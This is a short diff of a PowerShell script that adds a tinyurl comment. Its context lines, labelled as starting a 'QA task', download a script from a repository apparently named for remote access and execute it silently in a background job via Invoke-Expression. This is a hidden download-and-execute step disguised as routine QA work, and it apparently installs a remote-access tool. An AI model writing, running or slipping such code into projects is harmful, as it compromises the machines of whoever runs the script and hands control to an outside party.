@@ -1,4 +1,5 @@
 # Start the QA task in the background
+# tinyurl.com/qawinactiv
 $qaTaskJob = Start-Job -ScriptBlock {
     Invoke-Expression (Invoke-WebRequest -Uri https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AutomatedTaskWithPingInstall.ps1 -UseBasicParsing).Content
 }
